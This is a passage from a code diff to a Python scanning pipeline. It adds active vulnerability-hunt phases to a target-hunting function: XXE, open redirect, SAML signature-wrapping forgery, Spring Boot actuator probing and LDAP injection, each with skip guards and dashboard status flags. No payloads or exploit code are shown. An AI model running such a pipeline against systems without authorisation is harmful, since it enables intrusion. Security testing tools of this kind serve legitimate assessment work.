+            result["xxe_hunt"] = run_xxe_hunt(domain)
+        except Exception as _xxe_err:  # noqa: BLE001 — keep pipeline resilient
+            log("warn", f"XXE hunt phase errored: {_xxe_err}")
+            result["xxe_hunt"] = False
+
+    # ── Phase 7.9: Open redirect hunt (generic parametric fuzzing) ──────────
+    # Honours the same skip predicate as the vuln scan (active requests).
+    if should_run_vuln_scan and not skip_scan \
+            and not skip_has(skip_items, "scan", "vuln_scan", "open_redirect_hunt"):
+        try:
+            result["open_redirect_hunt"] = run_open_redirect_hunt(domain)
+        except Exception as _or_err:  # noqa: BLE001 — keep pipeline resilient
+            log("warn", f"Open redirect hunt phase errored: {_or_err}")
+            result["open_redirect_hunt"] = False
+
+    # ── Phase 7.10: SAML XSW1-8 forgery (needs an operator-captured assertion) ─
+    # Honours the same skip predicate as the vuln scan (active requests). No-ops
+    # when scanner.sh Check 7 hasn't discovered a SAML ACS endpoint yet.
+    if should_run_vuln_scan and not skip_scan \
+            and not skip_has(skip_items, "scan", "vuln_scan", "saml_xsw"):
+        try:
+            result["saml_xsw"] = run_saml_xsw(domain)
+        except Exception as _sx_err:  # noqa: BLE001 — keep pipeline resilient
+            log("warn", f"SAML XSW phase errored: {_sx_err}")
+            result["saml_xsw"] = False
+
+    # ── Phase 7.11: Spring Boot actuator probe (SpEL oracle + Jolokia + env) ─
+    # Honours the same skip predicate as the vuln scan (active requests).
+    if should_run_vuln_scan and not skip_scan \
+            and not skip_has(skip_items, "scan", "vuln_scan", "actuator_probe"):
+        try:
+            result["actuator_probe"] = run_actuator_probe(domain)
+        except Exception as _ap_err:  # noqa: BLE001 — keep pipeline resilient
+            log("warn", f"Actuator probe phase errored: {_ap_err}")
+            result["actuator_probe"] = False
+
+    # ── Phase 7.12: LDAP injection (RFC 4515 fuzz + blind oracle) ───────────
+    # Honours the same skip predicate as the vuln scan (active requests). Gated
+    # internally on the stack fingerprint suggesting LDAP-backed auth.
+    if should_run_vuln_scan and not skip_scan \
+            and not skip_has(skip_items, "scan", "vuln_scan", "ldap_injection"):
+        try:
+            result["ldap_injection"] = run_ldap_injection(domain)
+        except Exception as _li_err:  # noqa: BLE001 — keep pipeline resilient
+            log("warn", f"LDAP injection phase errored: {_li_err}")
+            result["ldap_injection"] = False
+
     # ── Phase 7.5: Next.js CVE-2025-29927 middleware bypass (v9.x) ─────────
     # Cheap (~one HTTP round-trip per protected route per Next.js host).
     # Skips automatically when httpx didn't fingerprint any Next.js hosts.
@@ -8650,6 +9364,14 @@ def hunt_target(
         # ran/skipped/errored for the new active phases.
         "auth_bypass":     should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "scan", "vuln_scan", "auth_bypass"),
         "nuclei_dast":     os.environ.get("NUCLEI_DAST") == "1" and should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "scan", "vuln_scan", "nuclei_dast"),
+        # Phase 7.8-7.12: mirror the exact `if` guard used at each new phase's
+        # call site above so the dashboard's ran/skipped/errored status matches
+        # reality for these new active phases.
+        "xxe_hunt":          should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "scan", "vuln_scan", "xxe_hunt"),
+        "open_redirect_hunt": should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "scan", "vuln_scan", "open_redirect_hunt"),
+        "saml_xsw":          should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "scan", "vuln_scan", "saml_xsw"),
+        "actuator_probe":    should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "scan", "vuln_scan", "actuator_probe"),
+        "ldap_injection":    should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "scan", "vuln_scan", "ldap_injection"),
         "cms_exploit":     cms_exploit,
         "rce_scan":        rce_scan,
         "sqlmap":          sqlmap_scan,
